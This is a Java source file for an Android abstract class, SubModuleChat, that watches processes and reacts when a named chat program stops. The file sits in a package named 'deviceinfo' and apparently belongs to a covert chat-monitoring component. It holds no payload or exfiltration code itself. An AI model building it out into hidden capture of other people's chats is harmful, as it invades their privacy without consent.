package com.android.deviceinfo.module.chat;

import java.io.IOException;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.module.ModuleChat;
import com.android.deviceinfo.module.SubModule;
import com.android.deviceinfo.util.Check;

public abstract class SubModuleChat extends SubModule {

	private static final String TAG = "SubModuleChat";
	@Override
	protected void go() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void start() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void stop() {
		// TODO Auto-generated method stub

	}
	
	@Override
	public int notification(ProcessInfo process) {

		if (process.processInfo.processName.contains(getObservingProgram())) {
			if (process.status == ProcessStatus.STOP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
				}
				notifyStopProgram(process.processInfo.processName);
				return 1;
			}
		}
		return 0;
	}
	
	protected ModuleChat getModule(){
		return (ModuleChat) module;
	}

	abstract void notifyStopProgram(String processName);

	abstract int getProgramId();
	abstract String getObservingProgram();
}
